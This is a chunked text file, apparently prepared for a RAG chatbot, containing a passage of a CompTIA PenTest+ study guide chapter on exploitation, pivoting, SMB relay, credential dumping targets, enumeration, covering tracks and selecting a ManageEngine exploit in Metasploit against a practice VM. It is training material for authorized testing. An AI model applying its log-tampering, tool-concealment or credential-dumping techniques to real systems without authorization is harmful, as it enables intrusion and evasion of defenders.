rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	and control (C2) frameworks Backdoor Web shell Trojan Rootkit Browser extensions Tampering security controls 5.2 Given a scenario, perform tasks to move laterally throughout the environment. Pivoting Relay creation Enumeration Service discovery Network traffic discovery Additional credential capture Credential dumping String searches Service discovery Server Message Block (SMB)/ Fileshares Remote Desktop Protocol (RDP)/ Virtual Network Computing (VNC) Secure Shell (SSH) Cleartext LDAP Remote Procedure Call (RPC) File Transfer Protocol (FTP) Telnet Hypertext Transfer Protocol (HTTP)/ Hypertext Transfer Protocol Secure (HTTPS) Web interfaces Line Printer Daemon (LPD) JetDirect RPC/Distributed Component Object Model (DCOM) Process IDs Window Management Instrumentation (WMI) Tools LOLBins Netstat Net commands cmd.exe explore.exe ftp.exe mmc.exe rundll msbuild route strings/findstr.exe Covenant CrackMapExec Impacket Netcat sshuttle Proxychains PowerShell ISE Batch files Metasploit PsExec Mimikatz 5.3 Summarize concepts related to staging and exfiltration. File encryption and compression Covert channel Steganography DNS Internet Control Message Protocol (ICMP) HTTPS Email Cross‐account resources Cloud storage Alternate data streams Text storage sites Virtual drive mounting Compromising systems and devices and then using the foothold you have gained to make further progress into your target's network is part of the core work that you perform as a penetration tester. In this chapter, we will continue the scenario you started in Chapter 4, “Vulnerability Scanning,” and Chapter 5, “Analyzing Vulnerability Scans.” In part 1 of the scenario, you will learn how to exploit the vulnerabilities we found and assessed in Chapter 5 using Metasploit as well as password attacks and other techniques. You will then learn how to escalate privileges once you have gained access to a system, search out more information, and take steps to ensure that you retain access and that you have concealed the evidence of your successful attack. We will explore the techniques that you can use to pivot—finding new targets from the perspective of the system you have gained access to. Using this new view, you will test trust boundaries and security zones while planning the next step in your attack process. Finally, in part 2 of the scenario, you will use techniques that maintain a persistent foothold on the system and help you hide the evidence of the compromise. Real World Scenario Scenario Part 1 In Chapters 4 and 5, you explored vulnerability scanning and how to interpret vulnerability scans from MCDS, LLC. Once you have completed that scan and identified vulnerabilities that you want to target, the next step in most penetration tests is to attempt to exploit the vulnerabilities you identified. In this scenario, you will use exploit tools to gain access to a vulnerable system and will then use the foothold you have gained to move further into the target network. For this scenario, we will add an additional finding to those we discussed in previous chapters. For this scenario, your vulnerability scans also identified a system with a well‐known vulnerability—the ManageEngine Desktop Central Remote Control Privilege Violation Vulnerability found in the Metasploitable virtual machine. What tools could you use to exploit this vulnerability? What commands would you
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	most penetration tests is to attempt to exploit the vulnerabilities you identified. In this scenario, you will use exploit tools to gain access to a vulnerable system and will then use the foothold you have gained to move further into the target network. For this scenario, we will add an additional finding to those we discussed in previous chapters. For this scenario, your vulnerability scans also identified a system with a well‐known vulnerability—the ManageEngine Desktop Central Remote Control Privilege Violation Vulnerability found in the Metasploitable virtual machine. What tools could you use to exploit this vulnerability? What commands would you use in Metasploit to check for compatible exploits? How can you use Metasploit to perform the exploit? What payload would you use, and why? Once you have access to the remote system, what actions should you take next? Exploits and Attacks Once you have conducted your initial survey of a target, including mapping out a full list of targets and probing them to identify potential vulnerabilities and weaknesses, the next step is to analyze that data to identify which targets you will prioritize, what exploits you will attempt, and how you will access systems and devices that you have compromised. After you have successfully compromised systems, post‐exploit activities become important. Knowing how to retain access and conceal your activities and how to leverage the access you have gained to pivot to other systems that may not have been accessible before is critical to your success. Choosing Targets In Chapter 5 you learned how to analyze a vulnerability report, including reviewing the severity of issues and CVSS scores and looking for missing patches and other issues. A vulnerability scan report is one of a number of inputs you may include in your target selection process. In addition, you may consider the primary goals of the penetration test you are conducting; the rules of engagement of the test; any additional data you have already gathered, such as account information or application details; and your own skill set. In most cases, you will target the most vulnerable systems for initial exploits to gain a foothold that may provide further access. In Figure 6.1, you can see an OpenVAS vulnerability scan of a sample highly vulnerable Windows system. This scan result shows 19 critical vulnerabilities as well as other vulnerabilities rated as Medium. In fact, using a normal OpenVAS scan, the system returns a total of 19 High, 61 Medium, and 7 Low issues. If a system like this showed up in a scan, it would be a tempting first target! FIGURE 6.1 OpenVAS/Greenbone vulnerability report Metasploitable: A Handy Pentesting Practice System The system shown in Figure 6.1, which we will use throughout this chapter to demonstrate the exploit process for a Windows server, is a Metasploitable 3 Windows 2008 virtual machine (VM). Metasploitable is an intentionally vulnerable system for penetration test practice. The current version of Metasploitable, version 3, is designed to automatically build Windows Server 2008 and Ubuntu Linux 14.04 virtual machines,
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	total of 19 High, 61 Medium, and 7 Low issues. If a system like this showed up in a scan, it would be a tempting first target! FIGURE 6.1 OpenVAS/Greenbone vulnerability report Metasploitable: A Handy Pentesting Practice System The system shown in Figure 6.1, which we will use throughout this chapter to demonstrate the exploit process for a Windows server, is a Metasploitable 3 Windows 2008 virtual machine (VM). Metasploitable is an intentionally vulnerable system for penetration test practice. The current version of Metasploitable, version 3, is designed to automatically build Windows Server 2008 and Ubuntu Linux 14.04 virtual machines, but it can be fragile. If you're up to the possible challenge, you can find setup and build instructions at https://github.com/rapid7/metasploitable3. If you're just getting started with penetration testing and don't have the time or experience that can be required to work through a sometimes challenging build process, the older version, Metasploitable 2, allows for a direct download of a VMWare or VirtualBox virtual machine from https://sourceforge.net/projects/metasploitable/files/Metasploitable2, which can help you get up to speed more quickly. Although Metasploitable 2 is dated, it is useful for basic skills practice. We will make use of it in some examples as well. In either case, remember to avoid exposing the vulnerable systems you will practice with to an untrusted network, because they are very, very vulnerable. Pivoting and Lateral Movement For the PenTest+ exam, you will need to perform tasks to move laterally throughout the environment when given a scenario. This is slightly different than pivoting but falls under the same type of movement that may be taken as next steps. First, let's understand both types of movement and their very subtle differences. Lateral Movement When there is a compromised system that an attacker gains access to and or a foothold on, the next step they can take is to “move” from that system to another point in the network or infrastructure. When a compromised system is a jumping‐off point, the next step the attacker would take would be to pivot from the initial breach point, which may be a compromised server as an example. Taking that initial step (or sidestep) from the initial point could be considered lateral movement. Pivoting Once you have obtained a foothold by compromising a system and ensuring that you will have continued access, you can leverage that system to obtain a new perspective on the target network or systems. Using a compromised system can provide a new path into a network or help you identify new targets that were not visible from the original scan viewpoint. Figure 6.2 shows an attacker pivoting once they have breached a vulnerable system inside an Internet‐accessible DMZ. The attacker may have discovered a vulnerable web service or another front‐facing, exploitable vulnerability. Once they have compromised a server in the DMZ, they can scan systems that were not previously visible through the multiple layers of firewalls that the example organization has put into place. Once a system has been compromised, the
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	network or systems. Using a compromised system can provide a new path into a network or help you identify new targets that were not visible from the original scan viewpoint. Figure 6.2 shows an attacker pivoting once they have breached a vulnerable system inside an Internet‐accessible DMZ. The attacker may have discovered a vulnerable web service or another front‐facing, exploitable vulnerability. Once they have compromised a server in the DMZ, they can scan systems that were not previously visible through the multiple layers of firewalls that the example organization has put into place. Once a system has been compromised, the next step would be to actually move to another and so on. FIGURE 6.2 Pivoting Note that in this case, both additional DMZ servers and workstations in the internal work are accessible. The same techniques discussed in previous chapters would then be leveraged to conduct information gathering and pre‐ exploit activities. Pivoting can also occur on a single system when attackers pivot from one account or service to another. This change in approach or view is a critical part of a penetration tester's process, since very few organizations have all their services and systems exposed to the outside world or to a single place that attackers can access. Understanding the organization's network and systems design, including internal and external defenses and services, can allow for more effective pivoting. An important post‐exploit task is cleaning up the tools, logs, and other traces that the exploit process may have left on the target machine. This can be very simple or quite complex, depending on the techniques that were used, the configuration and capabilities of the target system, and the tools that were needed to complete the attack. One of the first steps you should consider when covering your tracks is how to make the tools, daemons, or Trojans that you will use for long‐term access appear to be innocuous. Some tools like Meterpreter do this by inserting themselves into existing processes, using names similar to common harmless processes, or otherwise working to blend in with the normal behaviors and files found on the system. It can be difficult, if not impossible, to conceal all the tools required to compromise and retain access to a system. In cases where it is possible that your tools may be discovered, encryption and encoding tools like packers— polymorphic tools that change code so that it cannot be easily detected as the same as other versions of the same attack tools—and similar techniques can help slow down defenders. The same techniques used by advanced persistent threats and major malware packages to avoid detection and prevent analysis can be useful to pentesters because their goal is similar. In addition to hiding the tools and other artifacts required to retain access, cleanup is important. Penetration testers need to know where the files that their attacks and actions created will be and should ensure that those files have been removed. You also need to track the log files that may
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	be easily detected as the same as other versions of the same attack tools—and similar techniques can help slow down defenders. The same techniques used by advanced persistent threats and major malware packages to avoid detection and prevent analysis can be useful to pentesters because their goal is similar. In addition to hiding the tools and other artifacts required to retain access, cleanup is important. Penetration testers need to know where the files that their attacks and actions created will be and should ensure that those files have been removed. You also need to track the log files that may contain evidence of your actions. Although it may be tempting to wipe the log files, empty log files are far more suspicious than modified log files in most cases. If the target organization uses a remote logging facility, you may not be able to effectively remove all log‐based evidence, and the difference between local and remote logs can indicate compromise if staff at the target notice the changes. This means that most practitioners first choose to modify logs or clean them if possible, and then use log wiping only if they don't have another option. Concealing communications between the target system and a pentester's workstation, or between multiple compromised systems, is also a key part of covering your tracks. The same techniques used by advanced malware are useful here, too. A combination of encrypted communications, use of common protocols, and ensuring that outbound communication travels to otherwise innocuous hosts can help prevent detection. A direct RDP session in from the pentester's workstation after performing a series of port and vulnerability scans is much more likely to be detected by a reasonably competent security team! In a penetration test conducted against an organization with a strong security team, you may need to use more advanced techniques. Although they're beyond the scope of the PenTest+ exam and this book, anti‐analysis and anti‐forensic tools like packers and other encoders, as well as other techniques and applications, may be useful. Advanced Penetration Testing: Hacking the World's Most Secured Networks by Wil Allsopp (Wiley, 2017) is a good book to start with if you want to learn more. Relay Creation When you want to use lateral movement techniques while navigating through a penetrated network and its systems, a handy way to pivot is using Server Message Block (SMB) relaying. SMB is generally known for and commonly used in Microsoft‐based networks but also used in variations within other OS types like Linux. SMB protocol is a Microsoft development solution that allows for and facilitates the use of file sharing services. SMB relaying is an attack type that allows the attacker to exploit the underlying mechanism that enables SMB to provide authentication, which is NT LAN Manager (NTLM) and is used to authenticate users. The relay attack allows an attacker to impersonate a user via their compromised account, providing unauthorized access. Because of weaknesses in the underlying system or its configuration, an attacker can generate a named
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	commonly used in Microsoft‐based networks but also used in variations within other OS types like Linux. SMB protocol is a Microsoft development solution that allows for and facilitates the use of file sharing services. SMB relaying is an attack type that allows the attacker to exploit the underlying mechanism that enables SMB to provide authentication, which is NT LAN Manager (NTLM) and is used to authenticate users. The relay attack allows an attacker to impersonate a user via their compromised account, providing unauthorized access. Because of weaknesses in the underlying system or its configuration, an attacker can generate a named pipe listener used for network interprocess communication and forge a usable relay. This can be done on the pivot machine and allows the attacker the ability to laterally move if needed. An example of an SMB relay attack can be found on MITRE ATT&CK: https://attack.mitre.org/techniques/T1557/001. Enumeration A key part of choosing targets is finding potential targets from the multitude of possibilities you will encounter. Identifying users who have administrative or other more powerful roles, or users who have not logged in for long periods of time who may not notice strange use of their account, can be an important step for pentesters. Similarly, gathering information about groups, Active Directory forests, and the location of sensitive and unencrypted data is a task that pentesters must consider. We discussed some enumeration techniques in Chapter 3, “Information Gathering,” but here we will dive deeper into specific enumeration concepts for penetration testing objectives. The PenTest+ exam outline specifically calls out enumeration of users, groups, forests, sensitive data, and unencrypted files as topics you need to know for the exam. It doesn't delve into specific tools or techniques, so you should focus on understanding why and when these might be important to prepare for potential test questions you could encounter. Users User enumeration takes many forms: Brute‐force enumeration by attempting logins via a login page or system login Use of forgotten password tools to identify legitimate userIDs Checking for users by reviewing a Linux /etc/passwd file Gathering user information via Active Directory queries Listing users by looking for user directories and other filesystem artifacts Querying directory services for an organization Gathering email addresses from OSINT queries As you can see, even though this list is far from exhaustive there are many ways to gather lists of potential users. Additional information about the users can be very useful—knowing if they are an administrative user, knowing if they belong to specific groups or roles, and of course gaining access to full credential sets with passwords or even multifactor authentication can be a huge driver of success during a penetration test. Groups Enumerating groups can help pentesters find other targets who may have similar access rights or who may otherwise make sense to compromise. Groups can also help identify administrative users and accounts, making them a useful enumeration objective. On Linux systems, this can be as simple as viewing the /etc/group file, whereas Windows groups can be reviewed
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	very useful—knowing if they are an administrative user, knowing if they belong to specific groups or roles, and of course gaining access to full credential sets with passwords or even multifactor authentication can be a huge driver of success during a penetration test. Groups Enumerating groups can help pentesters find other targets who may have similar access rights or who may otherwise make sense to compromise. Groups can also help identify administrative users and accounts, making them a useful enumeration objective. On Linux systems, this can be as simple as viewing the /etc/group file, whereas Windows groups can be reviewed via Active Directory or PowerShell or by using the local Users and Groups GUI tools. Forests In Microsoft Active Directory (AD) environments, a forest is the topmost container for the AD environment. Thus, enumerating a forest means enumerating all the objects inside an AD environment. This can provide a massive amount of data about the computers, users, and other AD contents. In some cases where domains have trust relationships with other domains, it may even be possible to enumerate forests that are not part of your own domain. Network Traffic Discovery Another way to pivot and laterally move through a network is through network traffic discovery. Simply put, when you identify what your network traffic patterns are, you can start to put a roadmap together on how to travel within the traffic. For example, if you can map out your network routing infrastructure, you may be able to identify which routing protocols may be in use. If you can conduct a packet capture and discover the traffic, you may find that the routing protocol in use is OSPF which stands for Open Shortest Path First. OSPF is a routing protocol that allows data to be transferred to all points of the network via a routing protocol database of information. This is a commonly used internal routing protocol found in most networks today. Once you have discovered this type of traffic, you may then be able to move from router to router to penetrate deeper into the network. When attackers look to move deeper into a network after gaining initial access, what better way than through the use of a compromised router? If you are in the jumping‐off point of the initial target (router), you can run commands on it to show you things like what neighboring or adjacent routers are nearby. You can find the neighbor database that lists routers downstream. You can view the routing table and identify where the routes go and to what devices they go to. This is but one of many, many examples of using network traffic discovery as a way to identify methods to pivot. Credentials To conduct pivoting and lateral movement, you may find more success when you have credentials to work with. Attackers can create a hold on a system when they are able to locate user credentials, especially those that are privileged accounts. Once these credentials are captured, an attacker can
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	nearby. You can find the neighbor database that lists routers downstream. You can view the routing table and identify where the routes go and to what devices they go to. This is but one of many, many examples of using network traffic discovery as a way to identify methods to pivot. Credentials To conduct pivoting and lateral movement, you may find more success when you have credentials to work with. Attackers can create a hold on a system when they are able to locate user credentials, especially those that are privileged accounts. Once these credentials are captured, an attacker can use them in various ways. First, we need to understand how they are captured in the first place. Once they are captured and can be used, this is a way that pivoting and lateral movement can be conducted because the credentials are likely useful across the entire network and infrastructure. Capturing credentials can be done in various ways, but one of the most common ways it is done is through operating system (OS) credential dumping. OS credential dumping can be done through first gaining access to the system and then using various methods in specific services within the OS to gain this information. For example, let's say you were to conduct OS credential dumping in Windows, then you would have a handful of targets to access such as (but not limited to), LSASS memory, the Security Account Manager or SAM, NTDS, LSA Secrets, Cached Domain Credentials, and DCSync. If you want to conduct OS credential dumping on Linux, two common sections of the OS that would be accessed are the proc filesystem, or specifically /etc/passwd and /etc/shadow. Once credentials are dumped from these various locations and services, you can then use them to conduct attacks. Sensitive Data Understanding where sensitive data is can be a difficult task, and enumeration of sensitive data is more complex than many other types of enumeration because the data may not be in predictable places. Thus, enumeration of specific types of data is likely to require multiple pieces of information such as the following: The organization's or individual's practices and habits Security policies or procedures like encryption or other sensitive data storage techniques Compliance requirements that may impact how the data is stored and protected Other influences on the data's storage and format Even with this information in hand, you are likely to have to write specific queries or perform manual searches for at least some portion of sensitive data. Since sensitive data is often a key target for pentesters, particularly those doing compliance assessments, you're likely to need to spend the time to find it! Unencrypted Files Separating unencrypted files from encrypted files can be as simple as using a tool like strings to check for text that isn't encrypted. More complex techniques take advantage of file entropy (randomness) to programmatically determine whether files are likely encrypted. Although this technique can result in false positives, it can also be scripted to test files quickly.
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	write specific queries or perform manual searches for at least some portion of sensitive data. Since sensitive data is often a key target for pentesters, particularly those doing compliance assessments, you're likely to need to spend the time to find it! Unencrypted Files Separating unencrypted files from encrypted files can be as simple as using a tool like strings to check for text that isn't encrypted. More complex techniques take advantage of file entropy (randomness) to programmatically determine whether files are likely encrypted. Although this technique can result in false positives, it can also be scripted to test files quickly. In many penetration tests you are likely to quickly view discovered files and filesystems—perhaps with the cat command in Linux—allowing you to quickly assess if files are encrypted at rest and will require additional work to try to obtain them in unencrypted form. When you think about each of these types of enumeration, you should consider how and why you might use them and what scenarios or access might make them effective. If you have access to a system inside a Windows domain, then domain enumeration techniques that show the forest and objects inside the forest can be powerful. If, however, you don't have access to a system in the AD environment, you are likely to be better off identifying potential targets by gathering email addresses or even simply trying logins at an exposed interface or application. In any of these cases, enumeration techniques help identify more targets and provide clues about what steps you can take next during a penetration test. Identifying the Right Exploit Although finding such a large number of vulnerable services exposed on a single system is rare, it isn't uncommon to find many vulnerabilities of varying severity spread across systems in an environment. That makes selecting the right exploit important to make sure that you focus on attacks. Included in the list are seven vulnerabilities that OpenVAS rates as 9.0 or higher severity, which means that reviewing each of these is likely worthwhile—in fact, almost all the high‐rated vulnerabilities may be worth reviewing. We will focus on the ManageEngine Desktop Central 9 FileUploadServlet connection ID vulnerability shown in Figure 6.3. FIGURE 6.3 Distributed Ruby vulnerability The image is small, but you can see that the vulnerability has a severity of 10 and a quality of detection of 99 percent. Not only does this mean that the vulnerability is severe, but OpenVAS assures us that the vulnerability is correctly detected and is not a false positive. That pairing makes this a very attractive potential target. There are other vulnerabilities rated 10, but you should also look at lower‐ rated vulnerabilities that may provide information or allow you to take further actions. The Metasploitable 2 distribution provides a vulnerable Linux system, which includes a very old version of phpinfo. A scan of the system shows that this vulnerability is rated 7.5, with a quality of detection of 80 percent, shown in Figure 6.4. This isn't quite as
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	the vulnerability is severe, but OpenVAS assures us that the vulnerability is correctly detected and is not a false positive. That pairing makes this a very attractive potential target. There are other vulnerabilities rated 10, but you should also look at lower‐ rated vulnerabilities that may provide information or allow you to take further actions. The Metasploitable 2 distribution provides a vulnerable Linux system, which includes a very old version of phpinfo. A scan of the system shows that this vulnerability is rated 7.5, with a quality of detection of 80 percent, shown in Figure 6.4. This isn't quite as tempting as the ManageEngine vulnerability, but many vulnerabilities you encounter are more likely to be rated lower because organizations often have programs that patch most high‐severity issues. FIGURE 6.4 phpinfo() output accessible The output for phpinfo() tells us that this is an information exposure vulnerability rather than a directly exploitable vulnerability. You shouldn't ignore information exposure vulnerabilities, even if they have a lower rating. They're often a great way to gain additional useful information about how a system or application is configured and may provide the details you need to perform further exploits. In fact, this is incredibly easy to test. Figure 6.5 shows the results of visiting the phpinfo.php page described in the finding. You should always take advantage of easy information gathering if you can! Once you have identified the vulnerabilities that you want to target, you can dig into exploits for them. Not every vulnerability has exploit code released, and even when exploit code is released, it can vary in quality and availability. Your first thought after reading through Figure 6.5 may have been “Nobody would run an eight‐year‐old version of PHP!” Unfortunately for system administrators and security professionals, and luckily for pentesters, many embedded systems and prebuilt software packages include older versions of packages like PHP, .NET, Java, Tomcat, Flash, and other components. Once installed, many remain in place for years without being patched, providing a target for pentesters and attackers. In fact, during the writing of this book, one of the authors was involved in remediation of an organization that was still actively using Windows 98 systems to control critical equipment on a public, Internet‐facing network. FIGURE 6.5 phpinfo.php output Exploit Resources Exploits are available in a variety of places, ranging from personal sites to central collections. In addition to these, an increasing number of major vulnerabilities and exploits have their own publicity sites. Many exploits are hosted on sites like GitHub, with direct code download available as part of the initial vulnerability disclosure from the individual or organization who discovered it. Exploit quality varies; some exploits require specific configurations or circumstances to work properly, whereas others simply work with minimal effort. As a pentester, you will need to learn how to assess the quality of exploits that you intend to use, and you will need to plan for some of the exploits you attempt to fail. These exploit resources aren't included on the exam,
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	major vulnerabilities and exploits have their own publicity sites. Many exploits are hosted on sites like GitHub, with direct code download available as part of the initial vulnerability disclosure from the individual or organization who discovered it. Exploit quality varies; some exploits require specific configurations or circumstances to work properly, whereas others simply work with minimal effort. As a pentester, you will need to learn how to assess the quality of exploits that you intend to use, and you will need to plan for some of the exploits you attempt to fail. These exploit resources aren't included on the exam, but you'll likely want to learn about exploits as you learn how to use tools like Metasploit so that you can figure out which exploits to use. Thus, we've included them here to make sure you have the resources you need to prepare for the exam. Downloading exploits can be dangerous, since it can be challenging to verify that they have not had malware embedded in them by malicious actors. Some sites will provide an MD5 or SHA1 hash of the exploit files; others will simply provide a download or point to a code repository. Of course, antimalware tools often identify exploit code as malicious because it is used for attacks or includes tools that are commonly associated with malware or malicious activity! Fortunately, a number of large central sites specialize in making exploits and vulnerabilities searchable. The Exploit Database The Exploit Database (www.exploit-db.com) is one of the largest public exploit databases. It includes exploits, shellcode, and a variety of security papers as well as the Google Hacking Database, a collection of useful search techniques (often known as “Google dorks”) for pentesters and security professionals. The Rapid7 Vulnerability and Exploit Database For Metasploit users, the Rapid7 Vulnerability & Exploit Database (https://www.rapid7.com/db) is a useful tool, thanks to its integration with Metasploit exploits for both the Metasploit framework and Metasploit Pro. If you intend to use Metasploit to drive your penetration test, the ability to search directly for exploits based on vulnerabilities you have found during a scan can speed up your planning and exploit process. The National Vulnerability Database NIST maintains the National Vulnerability Database (NVD) at http://nvd.nist.gov. The NVD is an excellent vulnerability resource, but it does not focus on the availability of exploits as much as the other resources mentioned so far. Although exploits may be listed in the references section, they are not the focus of the NVD. VulDB Another option for vulnerability searches is http://vuldb.com, a large, crowdsourced vulnerability database. Unlike the other databases, VulDB includes an estimated exploit price and price rankings. This additional data can help pentesters understand where market focus is and can be a leading indicator of what exploits may become available in the near future. Building a Vulnerable Machine In this chapter, we will be using both Metasploitable 2 and Metasploitable 3, Rapid7's freely available vulnerable virtual machines. Instructions to build your own Metasploitable virtual machine for VirtualBox or VMware can
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	the references section, they are not the focus of the NVD. VulDB Another option for vulnerability searches is http://vuldb.com, a large, crowdsourced vulnerability database. Unlike the other databases, VulDB includes an estimated exploit price and price rankings. This additional data can help pentesters understand where market focus is and can be a leading indicator of what exploits may become available in the near future. Building a Vulnerable Machine In this chapter, we will be using both Metasploitable 2 and Metasploitable 3, Rapid7's freely available vulnerable virtual machines. Instructions to build your own Metasploitable virtual machine for VirtualBox or VMware can be found at https://github.com/rapid7/metasploitable3; however, the build process can be challenging. The authors of this book found the instructions at https://andrusk.com/?p=1091 useful for building in Ubuntu Linux and recommend the manual instructions for Windows to improve your chances of success. Once you have a working version of Metasploitable, you can see the full list of vulnerable services, along with credentials and other information, at https://github.com/rapid7/metasploitable3/wiki/Vulnerabilities, which you can practice against. If you find Metasploitable 3 challenging to set up, you can substitute Metasploitable 2 from https://sourceforge.net/projects/metasploitable/files/Metasploitable2; however, instructions in this chapter are based on Metasploitable 3. Although deliberately vulnerable machines are useful, you can also simply download and install an older version of a common operating system. Unpatched versions of Windows (XP, 7, 2008 Server) and older Linux distributions make great targets for practice exercises while you're learning the basics. Of course, you'll want to practice against current operating systems for real‐world experience as you advance as a pentester. Exploitation Toolkits and Tools Pentesters need to deal with large numbers of targets in a way that allows them to use both exploits and exploit payloads effectively to compromise systems and retain access to them. Exploit toolkits play a big role in that for many testers. Effective exploit toolkits combine prebuilt exploit modules, the ability to add and customize exploits in a common format, and a wide range of tools that make you a more effective pentester. Metasploit One of the most powerful exploit tools in a modern pentester's arsenal is Metasploit. For most pentesters, Metasploit is the default exploit tool in their arsenal, and it has become the most common development framework for exploits, with Metasploit plug‐ins being released shortly after many major vulnerability announcements. If you're using Kali Linux, Metasploit is already built in. If you are using another Linux distribution and need to install Metasploit, or you need to install it on a target system, you can download it from https://information.rapid7.com/metasploit-framework.html. Two major versions of Metasploit are available today: the Metasploit framework, a free, open source version of Metasploit, and Metasploit Pro, a commercial version with enhanced features. Additional versions include Metasploit Community, a free web user interface for the Metasploit framework; Metasploit Express; and Armitage, a graphical interface for Metasploit that focuses on team collaboration for exploitation and penetration testing. We will focus on the freely available Metasploit framework in this book. Metasploit includes tools and features
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	Linux distribution and need to install Metasploit, or you need to install it on a target system, you can download it from https://information.rapid7.com/metasploit-framework.html. Two major versions of Metasploit are available today: the Metasploit framework, a free, open source version of Metasploit, and Metasploit Pro, a commercial version with enhanced features. Additional versions include Metasploit Community, a free web user interface for the Metasploit framework; Metasploit Express; and Armitage, a graphical interface for Metasploit that focuses on team collaboration for exploitation and penetration testing. We will focus on the freely available Metasploit framework in this book. Metasploit includes tools and features that allow for more than just exploitation. In fact, Metasploit capabilities include discovery (Nmap and other tools), exploitation, payload delivery, and tools to help avoid detection. Metasploit Basics Metasploit has a multitude of features, but its basic use is relatively simple. At a high level, there are four main activities you need to know how to do: 1. Start the console. 2. Select an exploit. 3. Select a payload. 4. Run the exploit. We will explore this process over the next few pages, but you should bear in mind that Metasploit is complex enough to fill an entire book with its capabilities and uses. We'll cover one scenario, but you should practice with other exploits based on the vulnerability scans you have run previously. Make sure you focus on selecting a vulnerability, finding an exploit, and then exploiting it on a vulnerable target machine. Metasploit is a very powerful tool, and learning everything Metasploit has to offer could fill a book all by itself. We'll cover the basics of using Metasploit, but if you want to learn more, Offensive Security has a great Metasploit Unleashed guide available at https://www.offsec.com/metasploit-unleashed. If you want to dig deeper with Metasploit, we highly recommend Metasploit Unleashed. Starting Metasploit Starting Metasploit is simple—just enter the command msfconsole and wait for the msf> prompt to appear, as shown in Figure 6.6. FIGURE 6.6 The Metasploit console Metasploit has quite a few different initial load screens, so the image you see in Figure 6.6 may not match the screen that you'll see. Don't worry—and if you want to skip the ASCII part, just use the msfconsole ‐q option for quiet mode. Figure 6.6 shows the start screen, including the number of exploits and payloads that are loaded. If you've recently visited the Exploit‐DB site, you'll notice that there are far fewer exploits included in Metasploit than exist on the ExploitsDB site. Exploits for Metasploit have to be built in the Metasploit framework, and they need to be usable in ways that match Metasploit's capabilities. As a result, fewer exploits are built for Metasploit, but they are more generally useful. Once you have Metasploit started, you can review the commands available to you by typing a question mark and pressing Enter. Selecting Your Exploit In most cases, the next step toward a successful exploit is to search for your exploit. Earlier in this chapter we looked at OpenVAS
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	there are far fewer exploits included in Metasploit than exist on the ExploitsDB site. Exploits for Metasploit have to be built in the Metasploit framework, and they need to be usable in ways that match Metasploit's capabilities. As a result, fewer exploits are built for Metasploit, but they are more generally useful. Once you have Metasploit started, you can review the commands available to you by typing a question mark and pressing Enter. Selecting Your Exploit In most cases, the next step toward a successful exploit is to search for your exploit. Earlier in this chapter we looked at OpenVAS output for a Metasploitable 3 system including a ManageEngine file upload vulnerability. Now you can use that vulnerability data to guide your exploit selection. If you'd like to see the full list of exploits that are loaded, you can use the show exploits command shown in Figure 6.7. The output can be a bit overwhelming, since we have over 1,600 exploits loaded, but understanding how Metasploit lists and ranks exploits is helpful. FIGURE 6.7 Running show exploits in Metasploit As you can see, each exploit has a name, which includes a hierarchical naming convention. The first exploit on the list is aix/local/ibstat_path —this means it is an exploit for AIX, it is a local exploit, and it exploits the libstat path privilege escalation bug found on some AIX systems. Next, you'll see the disclosure date, the rank, and a description of the exploit. The ranking is important! It describes how likely the exploit is to be successful and what impact it may have on the target system, as shown in Table 6.1. TABLE 6.1 Metasploit exploit quality ratings Rank Description Excellent The exploit will never crash the service. Great The exploit has a default target and will either autodetect the target or perform a version check and use an application‐specific return address. Good The exploit has a default target and is the common case for the software. Normal The exploit is reliable but requires a specific version that can't be reliably autodetected. Average The exploit is unreliable or difficult to exploit. Low The exploit is very difficult or unlikely to successfully result in an exploit (less than a 50 percent chance) for common platforms. Manual The exploit is unstable, difficult to exploit, or may result in a denial of service, or the exploit requires specific manual configuration by the user. In general, this means that most pentesters will focus on exploits that are ranked as normal or higher and that using exploits ranked Good, Great, or Excellent is preferable. Fortunately, Metasploit has the ability to filter exploits based on their built‐in ranking. If you want to search only for exploits that are rated Great, you can search for them using the search ‐r great command or set a filter to only allow exploits of that level to be run by entering setg MinimumRank great . Searching for Exploits You can search for exploits inside Metasploit itself by using the search
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	In general, this means that most pentesters will focus on exploits that are ranked as normal or higher and that using exploits ranked Good, Great, or Excellent is preferable. Fortunately, Metasploit has the ability to filter exploits based on their built‐in ranking. If you want to search only for exploits that are rated Great, you can search for them using the search ‐r great command or set a filter to only allow exploits of that level to be run by entering setg MinimumRank great . Searching for Exploits You can search for exploits inside Metasploit itself by using the search command. This command includes a number of keywords that make searches much easier, as shown in Table 6.2. TABLE 6.2 Metasploit search terms Keyword Description app Client or server attack Search by module author bid Search by Bugtraq ID cve Search by CVE ID edb Search by Exploit‐DB ID name Search by descriptive name platform Search by platform (Windows, Linux, Unix, Android, etc.) ref Modules with a specific ref type Search by type: exploit, auxiliary, or post author Searching for exploits in Metasploit can sometimes take some work. The OpenVAS listing for the ManageEngine vulnerability shows a CVE number of CVE‐2015‐8249, which is a good place to start, but if you type search type:exploit cve:cve‐2015‐8249 , you won't find anything. In fact, not every exploit is fully documented in Metasploit with CVE, BID, EDB, and other details in place. Fortunately, other options exist. A bit of searching reveals that the exploit was created by sinn3r, so entering search type:exploit author:sinn3r will show us the results we want, including exploit/windows/http/manageengine_connectionid_write, the exploit we need. In addition to the built‐in command‐line search, Rapid7 makes a web‐based exploit database search available at https://www.rapid7.com/db/? type=metasploit. Finding the ManageEngine exploit there is simply a matter of entering ManageEngine and selecting Metasploit Modules from the drop‐down search list. Now that you have identified the exploit you want to use, telling Metasploit to use it is simple. At the msf> prompt, type use exploit/windows/http/manageengine_connectionid‐write , as shown in Figure 6.8. FIGURE 6.8 Selecting an exploit 